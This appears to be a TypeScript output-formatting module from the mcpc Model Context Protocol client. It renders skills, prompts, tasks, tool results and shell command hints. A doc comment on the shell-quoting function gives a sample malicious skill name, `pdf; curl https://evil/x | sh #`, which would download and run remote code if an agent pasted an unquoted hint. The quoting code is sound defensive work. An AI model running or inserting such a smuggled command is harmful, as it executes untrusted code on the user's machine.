    lines.push('');
    lines.push(
      styleInlineCode(
        `For a skill's instructions, run \`mcpc ${sessionName} skills-get <name>\` (use --raw for the markdown only).`
      )
    );
  }

  let output = lines.join('\n');
  if (options?.maxChars) {
    output = truncateOutput(output, options.maxChars);
  }
  return output;
}

/**
 * Format one verified skill file (`skills-get`): the skill's `SKILL.md` with its
 * supporting files listed underneath, or a single supporting file on its own.
 */
export function formatSkillDetail(
  skill: Skill,
  uri: string,
  content: DecodedResourceContent,
  options?: { sessionName?: string; maxChars?: number }
): string {
  const lines: string[] = [];
  const bullet = chalk.dim('*');
  const isSkillFile = uri === skill.uri;
  const verified =
    skill.resources === 'dynamic'
      ? chalk.gray('(dynamic skill — the server publishes no digests, so it is unverified)')
      : chalk.gray('(verified against the skill manifest)');

  if (isSkillFile) {
    lines.push(`${chalk.bold('Skill:')} ${inBackticks(skill.frontmatter.name)}`);
  } else {
    const name = uri.startsWith(`${skillRootOf(skill.uri)}/`)
      ? uri.slice(skillRootOf(skill.uri).length + 1)
      : uri;
    lines.push(
      `${chalk.bold('Skill file:')} ${inBackticks(name)} ${chalk.gray(`(skill ${skill.frontmatter.name})`)}`
    );
  }
  lines.push(`${chalk.bold('URI:')} ${chalk.gray(uri)}`);
  lines.push(
    `${chalk.bold('Size:')} ${formatByteSize(content.data.length)}${content.mimeType ? `, ${content.mimeType}` : ''} ${verified}`
  );

  if (content.binary) {
    lines.push('');
    lines.push(chalk.gray('(binary content not shown)'));
    if (options?.sessionName) {
      lines.push(
        chalk.dim(
          `↳ save to a file: ${commandHint(`mcpc ${options.sessionName} resources-read ${quoteShellArg(uri)} -o <file>`)}`
        )
      );
    }
  } else {
    lines.push('');
    lines.push(chalk.gray('````'));
    lines.push(content.data.toString('utf-8'));
    lines.push(chalk.gray('````'));
  }

  // The manifest is the authoritative list of the skill's files, so show it with the
  // SKILL.md rather than making the reader guess what `templates/` holds.
  if (isSkillFile && skill.resources !== 'dynamic') {
    const supporting = skill.resources.filter((file) => file.uri !== skill.uri);
    if (supporting.length > 0) {
      const root = skillRootOf(skill.uri);
      lines.push('');
      lines.push(chalk.bold(`Supporting files (${supporting.length}):`));
      for (const file of supporting) {
        const name = file.uri.startsWith(`${root}/`) ? file.uri.slice(root.length + 1) : file.uri;
        lines.push(
          `${bullet} ${inBackticks(name)} ${chalk.gray(`(${formatByteSize(file.size)})`)}`
        );
      }
      if (options?.sessionName) {
        const first = supporting[0]!;
        const name = first.uri.startsWith(`${root}/`)
          ? first.uri.slice(root.length + 1)
          : first.uri;
        lines.push('');
        lines.push(
          chalk.dim(
            `To read one, run: ${commandHint(`mcpc ${options.sessionName} skills-get ${quoteShellArg(skill.frontmatter.name)} ${quoteShellArg(name)}`)}`
          )
        );
      }
    }
  }

  let output = lines.join('\n');
  if (options?.maxChars) {
    output = truncateOutput(output, options.maxChars);
  }
  return output;
}

/** MIME type that marks a resource as a directory rather than a file. */
const DIRECTORY_MIME_TYPE = 'inode/directory';

/**
 * Format the `resources/directory/read` result: the direct children of one directory,
 * with subdirectories marked so a reader knows what can be descended into.
 */
export function formatDirectoryChildren(
  uri: string,
  children: Resource[],
  sessionName?: string,
  options?: FormatOptions
): string {
  const lines: string[] = [];
  const bullet = chalk.dim('*');

  if (children.length === 0) {
    lines.push(`${chalk.bold('Directory:')} ${chalk.gray(uri)}`);
    lines.push(chalk.gray('(empty)'));
    return lines.join('\n');
  }

  lines.push(chalk.bold(`Directory ${uri} (${children.length}):`));
  for (const child of children) {
    const isDirectory = child.mimeType === DIRECTORY_MIME_TYPE;
    const name = child.name || child.uri.slice(child.uri.lastIndexOf('/') + 1);
    const suffix = isDirectory
      ? chalk.gray('/')
      : child.mimeType
        ? ` ${chalk.gray(`(${child.mimeType})`)}`
        : '';
    lines.push(`${bullet} ${inBackticks(name)}${suffix}`);
    lines.push(`  ${chalk.gray(child.uri)}`);
  }

  if (sessionName) {
    const directory = children.find((child) => child.mimeType === DIRECTORY_MIME_TYPE);
    lines.push('');
    lines.push(
      directory
        ? `To descend, run: ${commandHint(`mcpc ${sessionName} resources-directory-read ${quoteShellArg(directory.uri)}`)}`
        : `To read a file, run: ${commandHint(`mcpc ${sessionName} resources-read <uri>`)}`
    );
  }

  let output = lines.join('\n');
  if (options?.maxChars) {
    output = truncateOutput(output, options.maxChars);
  }
  return output;
}

/** A skill's root directory: its `SKILL.md` URI with the file name removed. */
function skillRootOf(skillUri: string): string {
  return skillUri.replace(/\/SKILL\.md$/, '');
}

/**
 * Format a list of prompts with Markdown-like display
 */
export function formatPrompts(prompts: Prompt[]): string {
  const lines: string[] = [];

  // Header with prompt count
  lines.push(chalk.bold(`Prompts (${prompts.length}):`));

  // Summary list of prompts
  const bullet = chalk.dim('*');
  for (const prompt of prompts) {
    lines.push(`${bullet} ${inBackticks(prompt.name)}`);
  }

  // Detailed view for each prompt with separators
  for (const prompt of prompts) {
    lines.push('');
    lines.push(chalk.dim('---'));
    lines.push(formatPromptDetail(prompt));
  }

  return lines.join('\n');
}

/**
 * Format a single prompt with details (Markdown-like display)
 */
export function formatPromptDetail(prompt: Prompt): string {
  const lines: string[] = [];

  // Prompt header: Prompt: `name`
  lines.push(`${chalk.bold('Prompt:')} ${inBackticks(prompt.name)}`);

  // Arguments
  lines.push('');
  lines.push(chalk.bold('Arguments:'));
  if (prompt.arguments && prompt.arguments.length > 0) {
    for (const arg of prompt.arguments) {
      const typePart = theme.yellow('string'); // Prompt arguments are always strings
      const requiredPart = arg.required ? ` ${theme.red('[required]')}` : '';
      const description = arg.description ? ` ${chalk.dim('-')} ${arg.description}` : '';
      lines.push(`  ${inBackticks(arg.name)}: ${typePart}${requiredPart}${description}`);
    }
  } else {
    lines.push(chalk.gray('  (no arguments)'));
  }

  // Description in code block
  const description = (prompt.description || '').trim();
  if (description) {
    lines.push('');
    lines.push(chalk.bold('Description:'));
    lines.push(chalk.gray('````'));
    lines.push(description);
    lines.push(chalk.gray('````'));
  }

  return lines.join('\n');
}

/**
 * Check if data is a GetPromptResult (has messages array with role/content)
 */
function isPromptResult(data: unknown): data is GetPromptResult {
  if (!data || typeof data !== 'object') return false;
  const obj = data as Record<string, unknown>;
  if (!('messages' in obj) || !Array.isArray(obj.messages)) return false;
  if (obj.messages.length === 0) return false;
  const first = obj.messages[0] as Record<string, unknown>;
  return 'role' in first && 'content' in first;
}

/**
 * Format GetPromptResult messages with nice display
 */
function formatPromptResult(result: GetPromptResult): string {
  const lines: string[] = [];

  // Description first if present
  const description = (result.description || '').trim();
  if (description) {
    lines.push(chalk.bold('Description:'));
    lines.push(chalk.gray('````'));
    lines.push(description);
    lines.push(chalk.gray('````'));
    lines.push('');
  }

  // Messages header
  lines.push(chalk.bold(`Messages (${result.messages.length}):`));

  // Format each message
  for (const message of result.messages) {
    lines.push('');
    lines.push(`${chalk.bold('Role:')} ${theme.cyan(message.role)}`);
    lines.push(formatPromptContent(message.content));
  }

  return lines.join('\n');
}

/**
 * Format a `CompleteResult` for humans: one suggestion per line, a footer when the server
 * says the list is partial, and a hint showing how to use the first suggestion.
 */
export function formatCompletionResult(
  result: CompleteResult,
  request: Pick<CompleteRequestParams, 'ref' | 'argument' | 'context'>,
  target: string
): string {
  const { values, total, hasMore } = result.completion;
  const lines: string[] = [];

  if (values.length === 0) {
    lines.push(chalk.gray(`(no suggestions for ${request.argument.name})`));
  } else {
    lines.push(...values);
  }

  // Footer only when it says something the list itself does not
  if (hasMore || (total !== undefined && total !== values.length)) {
    const shown = total !== undefined ? `${values.length} of ${total}` : `${values.length}`;
    const more = hasMore ? ', more available' : '';
    lines.push('');
    lines.push(chalk.dim(`Showing ${shown} suggestions${more}`));
  }

  // The hint repeats the arguments the request carried as context, then the completed one
  // with the first suggestion, so the command it suggests means what the completion meant.
  const first = values[0];
  if (first !== undefined) {
    const args: Record<string, string> = {
      ...request.context?.arguments,
      [request.argument.name]: first,
    };
    lines.push('');
    if (request.ref.type === 'ref/prompt') {
      const pairs = Object.entries(args)
        .map(([name, value]) => `${name}:=${quoteShellArg(value)}`)
        .join(' ');
      lines.push(
        chalk.dim(
          `To use it, run: ${commandHint(`mcpc ${target} prompts-get ${quoteShellArg(request.ref.name)} ${pairs}`)}`
        )
      );
    } else {
      let expanded = request.ref.uri;
      for (const [name, value] of Object.entries(args)) {
        expanded = expanded.split(`{${name}}`).join(encodeURIComponent(value));
      }
      // Only a fully expanded template is readable; otherwise point at the template list
      if (expanded !== request.ref.uri && !/\{[^}]*\}/.test(expanded)) {
        lines.push(
          chalk.dim(
            `To read it, run: ${commandHint(`mcpc ${target} resources-read ${quoteShellArg(expanded)}`)}`
          )
        );
      } else {
        lines.push(
          chalk.dim(
            `To see the template, run: ${commandHint(`mcpc ${target} resources-templates-list`)}`
          )
        );
      }
    }
  }

  return lines.join('\n');
}

/**
 * Format a single content block from a prompt message
 */
function formatPromptContent(content: PromptMessage['content']): string {
  const lines: string[] = [];

  // ContentBlock is a union type, use type narrowing
  const block = content;

  switch (block.type) {
    case 'text':
      lines.push(chalk.gray('````'));
      lines.push(block.text || '');
      lines.push(chalk.gray('````'));
      break;

    case 'image':
      lines.push(chalk.gray('````'));
      lines.push(`[Image: ${block.mimeType || 'unknown type'}]`);
      if (block.data) {
        lines.push(`${block.data.substring(0, 50)}...`);
      }
      lines.push(chalk.gray('````'));
      break;

    case 'audio':
      lines.push(chalk.gray('````'));
      lines.push(`[Audio: ${block.mimeType || 'unknown type'}]`);
      lines.push(chalk.gray('````'));
      break;

    case 'resource_link':
      lines.push(chalk.gray('````'));
      lines.push(`[Resource link: ${block.uri || 'unknown'}]`);
      lines.push(chalk.gray('````'));
      break;

    case 'resource':
      lines.push(chalk.gray('````'));
      if (block.resource) {
        lines.push(`[Embedded resource: ${block.resource.uri}]`);
        if ('text' in block.resource && block.resource.text) {
          lines.push(block.resource.text);
        }
      } else {
        lines.push('[Embedded resource]');
      }
      lines.push(chalk.gray('````'));
      break;

    default:
      // Fallback for unknown content types
      lines.push(chalk.gray('````'));
      lines.push(JSON.stringify(content, null, 2));
      lines.push(chalk.gray('````'));
  }

  return lines.join('\n');
}

/**
 * Get a colored status indicator for a task status
 */
function taskStatusLabel(status: string): string {
  const label = (icon: string): string => `${icon} ${status}`;
  switch (status) {
    case 'working':
      return theme.cyan(label('⟳'));
    case 'input_required':
      return theme.yellow(label('?'));
    case 'completed':
      return theme.green(label('✔'));
    case 'failed':
      return theme.red(label('✖'));
    case 'cancelled':
      return chalk.gray(label('⊘'));
    default:
      return chalk.gray(label('·'));
  }
}

/** Human-readable duration for the millisecond fields a task carries (TTL, poll interval). */
function formatMillis(millis: number): string {
  if (millis < 1000) return `${millis} ms`;
  if (millis < 60_000) return `${Number((millis / 1000).toFixed(1))} s`;
  if (millis < 3_600_000) return `${Number((millis / 60_000).toFixed(1))} min`;
  return `${Number((millis / 3_600_000).toFixed(1))} h`;
}

/**
 * Format a single task with details. Handles both task shapes: the 2025-11-25 core
 * `Task` and the 2026-07-28 extension's, which inlines the outcome (result, error, or the
 * input the server is waiting for).
 */
export function formatTask(task: AnyTask, options: { sessionName?: string } = {}): string {
  const lines: string[] = [];

  lines.push(`${chalk.bold('Task ID:')} ${inBackticks(task.taskId)}`);
  lines.push(`${chalk.bold('Status:')} ${taskStatusLabel(task.status)}`);

  if (task.statusMessage) {
    lines.push(`${chalk.bold('Message:')} ${task.statusMessage}`);
  }

  if (task.createdAt) {
    lines.push(`${chalk.bold('Created:')} ${task.createdAt}`);
  }
  if (task.lastUpdatedAt) {
    lines.push(`${chalk.bold('Updated:')} ${task.lastUpdatedAt}`);
  }

  const extension = isExtensionTask(task);
  const ttlMillis = extension ? task.ttlMs : task.ttl;
  if (ttlMillis !== undefined) {
    lines.push(
      `${chalk.bold('TTL:')} ${ttlMillis === null ? 'unlimited' : formatMillis(ttlMillis)}`
    );
  }
  const pollMillis = extension ? task.pollIntervalMs : task.pollInterval;
  if (typeof pollMillis === 'number') {
    lines.push(`${chalk.bold('Poll interval:')} ${formatMillis(pollMillis)}`);
  }

  if (extension) {
    if (task.status === 'failed' && task.error) {
      lines.push(
        `${chalk.bold('Error:')} ${task.error.message} ${chalk.dim(`(code ${task.error.code})`)}`
      );
    }
    if (task.status === 'input_required') {
      const methods = Object.values(task.inputRequests ?? {}).map((request) => {
        const method = (request as { method?: unknown } | null)?.method;
        return typeof method === 'string' ? method : 'unknown request';
      });
      lines.push(
        `${chalk.bold('Waiting for:')} ${methods.join(', ') || 'client input'} ` +
          chalk.dim('(mcpc cannot answer input requests; cancel the task or wait)')
      );
    }
    if (task.status === 'completed' && task.result) {
      const session = options.sessionName ?? '@session';
      lines.push(
        `${chalk.bold('Result:')} ready ` +
          chalk.dim(
            `(run: ${commandHint(`mcpc ${session} tasks-result ${task.taskId}`)}, or add --json to see it here)`
          )
      );
    }
  }

  return lines.join('\n');
}

/**
 * Format a list of tasks as a summary table. `tracked` marks the 2026-07-28 listing,
 * which holds the tasks this session created rather than everything the server has.
 */
export function formatTasks(taskList: AnyTask[], options: { tracked?: boolean } = {}): string {
  const lines: string[] = [];

  const heading = options.tracked ? 'Tasks started from this session' : 'Tasks';
  lines.push(chalk.bold(`${heading} (${taskList.length}):`));

  const bullet = chalk.dim('*');
  for (const task of taskList) {
    const statusStr = taskStatusLabel(task.status);
    const msgStr = task.statusMessage ? chalk.dim(` - ${task.statusMessage}`) : '';
    lines.push(`${bullet} ${inBackticks(task.taskId)}  ${statusStr}${msgStr}`);
  }

  return lines.join('\n');
}

/**
 * Format a single MCP content block for human display.
 * Used by `formatCallToolResultHuman` to render each block in the Content section.
 */
function formatContentBlock(block: ContentBlock, lines: string[]): void {
  const bullet = chalk.dim('*');

  switch (block.type) {
    case 'text':
      lines.push(chalk.gray('````'));
      lines.push(block.text);
      lines.push(chalk.gray('````'));
      break;

    case 'resource_link':
      lines.push(chalk.bold('Resource link'));
      lines.push(`${bullet} URI: ${block.uri}`);
      if (block.name) lines.push(`${bullet} Name: ${block.name}`);
      if (block.description) {
        lines.push(
          `${bullet} Description: ${chalk.gray('````')}${block.description}${chalk.gray('````')}`
        );
      }
      if (block.mimeType) lines.push(`${bullet} MIME type: ${block.mimeType}`);
      break;

    case 'image':
      lines.push(
        `[Image: ${block.mimeType || 'unknown type'}${block.data ? `, ${block.data.length} chars base64` : ''}]`
      );
      break;

    case 'audio':
      lines.push(
        `[Audio: ${block.mimeType || 'unknown type'}${block.data ? `, ${block.data.length} chars base64` : ''}]`
      );
      break;

    case 'resource':
      lines.push(chalk.bold('Embedded resource'));
      if (block.resource) {
        lines.push(`${bullet} URI: ${block.resource.uri}`);
        if (block.resource.mimeType) lines.push(`${bullet} MIME type: ${block.resource.mimeType}`);
        if ('text' in block.resource && block.resource.text) {
          lines.push(chalk.gray('````'));
          lines.push(block.resource.text);
          lines.push(chalk.gray('````'));
        }
      }
      break;

    default:
      lines.push(JSON.stringify(block, null, 2));
  }
}

/**
 * Return the indices of text content blocks that are JSON serializations of
 * `structuredContent`.  Per the MCP spec, servers SHOULD include such a block
 * for backwards compatibility — we skip those blocks from the Content section
 * so the better-formatted Structured content section is the canonical view.
 *
 * `structuredContent` may be any JSON value since 2026-07-28 (SEP-2106), and a
 * server serializing an array or a primitive duplicates itself just as much as
 * one serializing an object, so the comparison is on the canonical JSON.
 */
function findDuplicateTextBlocks(
  content: CallToolResult['content'],
  structuredContent: unknown
): Set<number> {
  const dupes = new Set<number>();
  const canonical = JSON.stringify(structuredContent);
  for (let i = 0; i < content.length; i++) {
    const block = content[i];
    if (!block || block.type !== 'text') continue;
    try {
      const parsed: unknown = JSON.parse((block as { text: string }).text.trim());
      if (JSON.stringify(parsed) === canonical) dupes.add(i);
    } catch {
      // not valid JSON — keep the block
    }
  }
  return dupes;
}

/**
 * Format a `CallToolResult` for human-readable display.
 *
 * Sections (each printed only when present):
 * 1. **Content:** — each content block rendered per its type (text blocks
 *    that duplicate `structuredContent` are omitted)
 * 2. **Structured content:** — `structuredContent` as syntax-highlighted JSON,
 *    shown only when there is no visible Content. Otherwise a hint points to
 *    `--json`, which always includes the full payload.
 * 3. **Metadata:** — `_meta` as syntax-highlighted JSON
 */
export function formatCallToolResultHuman(result: CallToolResult): string {
  const lines: string[] = [];

  // Identify text blocks that are just a JSON dump of structuredContent.
  // Since protocol 2026-07-28 (SEP-2106), structuredContent may be any JSON value;
  // an empty object carries nothing, so it counts as absent.
  const sc = result.structuredContent;
  const scObject =
    typeof sc === 'object' && sc !== null && !Array.isArray(sc)
      ? (sc as Record<string, unknown>)
      : undefined;
  const hasStructuredContent = scObject
    ? Object.keys(scObject).length > 0
    : sc !== undefined && sc !== null;
  const content = result.content;
  let skipIndices = new Set<number>();
  if (hasStructuredContent && content) {
    skipIndices = findDuplicateTextBlocks(content, sc);
  }

  const visibleContent = content?.filter((_, i) => !skipIndices.has(i)) ?? [];

  // Content section — skip duplicate text blocks
  if (visibleContent.length > 0) {
    lines.push(chalk.bold('Content:'));
    for (let i = 0; i < visibleContent.length; i++) {
      if (i > 0) lines.push('');
      formatContentBlock(visibleContent[i] as ContentBlock, lines);
    }
  }

  // Structured content section — only when Content is empty, to avoid
  // redundant verbose output for LLMs. Available via `--json` if needed.
  if (hasStructuredContent && visibleContent.length === 0) {
    if (lines.length > 0) lines.push('');
    lines.push(chalk.bold('Structured content:'));
    const scJson = JSON.stringify(sc, null, 2);
    lines.push(process.stdout.isTTY ? highlightJson(scJson) : scJson);
  } else if (hasStructuredContent) {
    lines.push('', chalk.dim('To see the `structuredContent` field, re-run with --json'));
  }

  // Metadata section — syntax-highlighted JSON, shown last
  const meta = result._meta;
  if (meta && typeof meta === 'object' && Object.keys(meta).length > 0) {
    if (lines.length > 0) lines.push('');
    lines.push(chalk.bold('Metadata:'));
    const metaJson = JSON.stringify(meta, null, 2);
    lines.push(process.stdout.isTTY ? highlightJson(metaJson) : metaJson);
  }

  if (lines.length === 0) {
    return chalk.gray('(no content)');
  }

  return lines.join('\n');
}

/**
 * Format a generic object as key-value pairs
 */
export function formatObject(obj: Record<string, unknown>): string {
  const lines: string[] = [];

  for (const [key, value] of Object.entries(obj)) {
    const formattedKey = theme.cyan(`${key}:`);
    let formattedValue: string;
    if (value === null || value === undefined) {
      formattedValue = chalk.gray(String(value));
    } else if (typeof value === 'object') {
      formattedValue = JSON.stringify(value, null, 2);
    } else if (
      typeof value === 'string' ||
      typeof value === 'number' ||
      typeof value === 'boolean'
    ) {
      formattedValue = String(value);
    } else {
      // Fallback for other types (bigint, symbol, function)
      formattedValue = JSON.stringify(value);
    }
    lines.push(`${formattedKey} ${formattedValue}`);
  }

  return lines.join('\n');
}

/**
 * Format a success message
 */
export function formatSuccess(message: string): string {
  return theme.green(`✓ ${message}`);
}

/**
 * Format an error message
 */
export function formatError(message: string): string {
  return theme.red(`✗ ${message}`);
}

/**
 * Format a warning message
 */
export function formatWarning(message: string): string {
  return theme.yellow(`⚠ ${message}`);
}

/**
 * Format an info message
 */
export function formatInfo(message: string): string {
  return theme.cyan(`ℹ ${message}`);
}

/**
 * Format a filesystem path for display so it can be copy-pasted into a shell as-is.
 *
 * Paths made only of safe characters are returned unchanged; paths containing spaces
 * or other shell-significant characters are wrapped in double quotes (which work in
 * POSIX shells and Windows cmd/PowerShell for typical paths). Only the characters that
 * remain special inside POSIX double quotes are escaped.
 *
 * The backslash is the path separator on Windows (safe to paste unquoted into
 * cmd/PowerShell) but a shell escape character on POSIX, so it counts as a safe
 * character only on Windows — a plain `C:\Users\foo\mcp.json` stays unquoted there,
 * while `C:\Users\foo bar\mcp.json` is still quoted because of the space.
 *
 * For human-readable output only; never use it for `--json` output or actual file I/O.
 */
export function formatPath(p: string, platform: NodeJS.Platform = process.platform): string {
  return quoteShellArg(p, platform);
}

/**
 * Quote a value for a copy-paste shell hint. Server-controlled strings — a skill name, a
 * resource URI — are interpolated into `run: mcpc …` hints that agents follow verbatim, so
 * anything outside a conservative safe set is wrapped in double quotes with the characters
 * that stay special inside them escaped. A skill named `pdf; curl https://evil/x | sh #`
 * then stays one argument instead of ending the command and starting another.
 *
 * Same rules as `formatPath` (which delegates here). Human-readable output only; never use
 * it for `--json` output.
 */
export function quoteShellArg(value: string, platform: NodeJS.Platform = process.platform): string {
  const isSafe =
    platform === 'win32'
      ? /^[A-Za-z0-9_./:@%+,=~\\-]+$/.test(value)
      : /^[A-Za-z0-9_./:@%+,=~-]+$/.test(value);
  if (isSafe) return value;
  // Inside POSIX double quotes `$`, a backtick, `"` and `\` stay special. The backslash must be
  // escaped too: left alone, `\$(id)` would render as `\\$(id)`, where `\\` is a literal backslash
  // and `$(id)` still runs, and a trailing backslash would escape the closing quote. On Windows
  // the backslash is the path separator and is passed through unchanged.
  const special = platform === 'win32' ? /(["`$])/g : /(["`$\\])/g;
  return `"${value.replace(special, '\\$&')}"`;
}

/**
 * Format an inline connection-status badge for a session — `● live` or `● failed — <reason>`.
 * Used to annotate each config entry with its bulk-connect result. Bulk connect waits for each
 * handshake, so any connected session — freshly created or already running — shows green
 * `● live`, matching the session list. Human output only.
 */
export function formatConnectStatusBadge(
  status: 'active' | 'created' | 'failed',
  error?: string
): string {
  switch (status) {
    case 'active':
    case 'created':
      return `${theme.green('●')} ${theme.green('live')}`;
    case 'failed':
      return `${theme.red('●')} ${theme.red('failed')}${error ? chalk.dim(` — ${error}`) : ''}`;
  }
}

export function formatTaskCommandsHint(
  target: string,
  taskId?: string,
  status?: TaskStatus
): string {
  const id = taskId ?? '<taskId>';
  const lines = [
    '\nAvailable commands:',
    `  ${commandHint(`mcpc ${target} tasks-get ${id}`)}`,
    `  ${commandHint(`mcpc ${target} tasks-result ${id}`)}`,
  ];
  // Only suggest cancel while the task is still active (or when status is unknown,
  // e.g. the generic list hint where individual task statuses vary).
  if (status === undefined || status === 'working' || status === 'input_required') {
    lines.push(`  ${commandHint(`mcpc ${target} tasks-cancel ${id}`)}`);
  }
  return lines.join('\n');
}

/**
 * Truncate formatted output string to maxChars, appending a notice about truncation.
 * Returns the original string if within limit.
 */
export function truncateOutput(output: string, maxChars: number): string {
  if (output.length <= maxChars) return output;
  const truncated = output.substring(0, maxChars);
  const totalSize =
    output.length >= 1024 ? `${(output.length / 1024).toFixed(1)}KB` : `${output.length} chars`;
  return `${truncated}\n\n... output truncated (${totalSize} total, showing first ${maxChars} chars). Use --max-chars to adjust.`;
}

/**
 * Truncate string with ellipsis if significantly longer than maxLen
 * Allows +3 chars slack to avoid weird cutoffs
 */
function truncateWithEllipsis(str: string, maxLen: number): string {
  if (str.length <= maxLen + 3) return str;
  return str.substring(0, maxLen - 1) + '…';
}

/**
 * Format a session line for display (without status)
 * Returns: "@name → target (OAuth: profile)" with colors applied
 */
export function formatSessionLine(session: SessionData): string {
  // Format session name (cyan)
  const nameStr = theme.cyan(session.name);

  // Format target
  let target: string;
  if (session.server.url) {
    // For http: show full URL as there might be different MCP servers on different paths
    target = session.server.url;
  } else {
    // For stdio: show command + args
    target = session.server.command || 'unknown';
    if (session.server.args && session.server.args.length > 0) {
      target += ' ' + session.server.args.join(' ');
    }
  }
  const targetStr = truncateWithEllipsis(target, 80);

  // Format auth info. OAuth and x402 are mutually exclusive auth mechanisms;
  // x402 takes precedence when both happen to be present on the session record.
  let infoStr = '';
  if (session.x402) {
    infoStr = theme.yellow('[x402]');
  } else if (!session.server.command && session.profileName) {
    infoStr = chalk.dim('(OAuth: ') + theme.magenta(session.profileName) + chalk.dim(')');
  }

  // Add proxy info separately (not dimmed, for visibility)
  let proxyStr = '';
  if (session.proxy) {
    proxyStr =
      ' ' +
      theme.green('[proxy: ') +
      chalk.greenBright(`${session.proxy.host}:${session.proxy.port}`) +
      theme.green(']');
  }

  const suffix = [infoStr, proxyStr].filter(Boolean).join(' ');
  return `${nameStr} → ${targetStr}${suffix ? ' ' + suffix : ''}`;
}

/**
 * Options for logTarget
 */
export interface LogTargetOptions {
  outputMode: OutputMode;
  hide?: boolean | undefined;
}

/**
 * Log session info prefix (only in human mode)
 * Shows: [@name → server (auth)]
 */
export async function logTarget(target: string, options: LogTargetOptions): Promise<void> {
  if (options.outputMode !== 'human' || options.hide) {
    return;
  }

  const session = await getSession(target);
  if (session) {
    console.log(`[${formatSessionLine(session)}]\n`);
  }
  // Session not found - don't print anything, let the error handler show the message
}

/**
 * Format JSON error output
 */
export function formatJsonError(error: Error, code: number): string {
  return formatJson({
    error: error.message,
    code,
  });
}

/** Human-readable name of a transport kind (the `--json` field keeps the wire spelling). */
function formatTransportKind(transport: TransportKind): string {
  return transport === 'stdio' ? 'stdio' : 'Streamable HTTP';
}

/**
 * Settings the server declared for the skills extension, or `undefined` when it did not
 * declare it at all (an empty object means "supported, with no optional features").
 */
function skillsExtensionSettings(
  capabilities?: ServerCapabilities
): Record<string, unknown> | undefined {
  return declaredExtensionSettings(capabilities, SKILLS_EXTENSION_KEY);
}

/**
 * One capability line per extension the server declares, minus the `rendered` ids the
 * caller has already put on the screen itself (skills, which gets a line carrying the
 * settings it was declared with).
 *
 * Extensions are opt-in on both sides, so a server declaring one says nothing about what
 * mcpc can do with it: the annotation is what keeps the list from reading as a promise.
 * Extensions mcpc does not know are still listed, by identifier — a server offering
 * something new is worth seeing, even when mcpc can only name it.
 */
function formatExtensionList(
  capabilities: ServerCapabilities | undefined,
  rendered: readonly string[] = []
): string[] {
  const bullet = chalk.dim('*');
  const caps = capabilities as { extensions?: Record<string, unknown> } | undefined;
  return Object.keys(caps?.extensions ?? {})
    .filter((id) => !rendered.includes(id))
    .map((id) => {
      const extension = findMcpExtension(id);
      if (!extension) {
        return `${bullet} ${id} ${chalk.gray('(unknown extension)')}`;
      }
      const note = extension.support === 'full' ? 'extension' : 'extension, not supported by mcpc';
      return `${bullet} ${extension.label} ${chalk.gray(`(${note})`)}`;
    });
}

/**
 * Bullet list of the capabilities a server actually exposes (empty when it exposes none).
 *
 * Some capabilities are era-dependent: a 2026-07-28 server may still advertise `logging`
 * (log notifications survived) or the 2025 `tasks` capability, but the matching mcpc
 * commands don't work there — `logging/setLevel` was removed from the protocol and tasks
 * moved to the `io.modelcontextprotocol/tasks` extension, which is what the task commands
 * speak on that connection. Annotate those instead of advertising something that only
 * errors out.
 */
function formatCapabilityList(
  capabilities: ServerCapabilities | undefined,
  protocolVersion?: string
): string[] {
  const bullet = chalk.dim('*');
  const isModern = !!protocolVersion && isModernProtocolVersion(protocolVersion);
  const list: string[] = [];

  if (capabilities?.tools) {
    list.push(`${bullet} tools ${capabilities.tools.listChanged ? '(dynamic)' : '(static)'}`);
  }

  if (capabilities?.resources) {
    const features: string[] = [];
    if (capabilities.resources.subscribe) features.push('subscribe');
    if (capabilities.resources.listChanged) features.push('dynamic list');
    const featureStr = features.length > 0 ? ` (supports ${features.join(', ')})` : '';
    list.push(`${bullet} resources${featureStr}`);
  }

  if (capabilities?.prompts) {
    list.push(`${bullet} prompts${capabilities.prompts.listChanged ? ' (dynamic list)' : ''}`);
  }

  if (capabilities?.logging) {
    // Modern era: log notifications still arrive, but logging-set-level is gone
    list.push(`${bullet} logging${isModern ? ` ${chalk.gray('(notifications only)')}` : ''}`);
  }

  if (capabilities?.completions) {
    list.push(`${bullet} completions`);
  }

  if (capabilities?.tasks) {
    const featureStr = capabilities.tasks.requests?.tools?.call ? ' (tools)' : '';
    const note = isModern ? ` ${chalk.gray(`(not usable on MCP ${protocolVersion})`)}` : '';
    list.push(`${bullet} tasks${featureStr}${note}`);
  }

  const rendered: string[] = [];

  const skills = skillsExtensionSettings(capabilities);
  if (skills) {
    // The extension is specified against 2026-07-28 and later, so on a legacy connection
    // its commands would only error out — say so rather than advertise them.
    const note = isModern
      ? skills.directoryRead === true
        ? ' (with directory reads)'
        : ''
      : ` ${chalk.gray(`(not usable on MCP ${protocolVersion})`)}`;
    list.push(`${bullet} skills${note}`);
    rendered.push(SKILLS_EXTENSION_KEY);
  }

  // The tasks extension is likewise a 2026-07-28 thing: on a modern connection the
  // generic extension line below says it all, while a 2025-era server declaring it gets
  // the same out-of-era note as skills (its tasks run through the core protocol there).
  if (!isModern && declaredExtensionSettings(capabilities, TASKS_EXTENSION_KEY)) {
    list.push(`${bullet} tasks ${chalk.gray(`(extension, not usable on MCP ${protocolVersion})`)}`);
    rendered.push(TASKS_EXTENSION_KEY);
  }

  // Everything else the server declared, minus the lines just written above.
  list.push(...formatExtensionList(capabilities, rendered));

  return list;
}

/**
 * Format the server identity block: the name/version headline plus the optional
 * `description` and `websiteUrl` a server may advertise in its `serverInfo`.
 *
 * Those two fields are the only human-readable statement of what the server actually is
 * and where it is documented, so they belong next to the name instead of staying a
 * `--json`-only detail. Both are optional — servers that omit them keep the single line.
 * Long descriptions are printed verbatim and left to the terminal to wrap, like
 * instructions and tool descriptions elsewhere in this file.
 */
function formatServerIdentity(serverInfo: Implementation): string[] {
  const lines = [
    chalk.bold('Server:') + ` ${serverInfo.name} (version: ${serverInfo.version || 'N/A'})`,
  ];

  const bullet = chalk.dim('*');
  const description = serverInfo.description?.trim();
  if (description) {
    // Continuation lines of a multi-line description stay aligned under its first line
    const [first, ...rest] = description.split('\n');
    const continuationIndent = ' '.repeat('* Description: '.length);
    lines.push(`${bullet} Description: ${first}`, ...rest.map((line) => continuationIndent + line));
  }

  if (serverInfo.websiteUrl) {
    lines.push(`${bullet} Website: ${theme.cyan(serverInfo.websiteUrl)}`);
  }

  return lines;
}

/**
 * Format the result of a live `server/discover` request (2026-07-28+).
 *
 * Deliberately narrower than {@link formatServerDetails}: it reports what the server just
 * advertised — every protocol version it supports, its capabilities, its instructions —
 * and leaves the connection state and command inventory to `mcpc @session`.
 */
export function formatDiscoverResult(
  result: DiscoverResult,
  target: string,
